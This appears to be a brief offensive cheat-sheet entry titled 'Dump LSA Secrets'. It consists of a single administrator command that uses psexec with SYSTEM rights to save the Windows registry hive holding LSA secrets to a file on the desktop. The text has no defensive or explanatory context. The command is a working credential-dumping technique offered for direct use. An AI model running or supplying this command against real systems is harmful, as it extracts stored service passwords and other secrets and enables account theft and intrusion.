# Dump LSA Secrets

Run the following command as Administrator:

```powershell
psexec -accepteula -s reg save HKLM\Security\Policy\Secrets C:\Users\<user>\Desktop\secrets /y
```

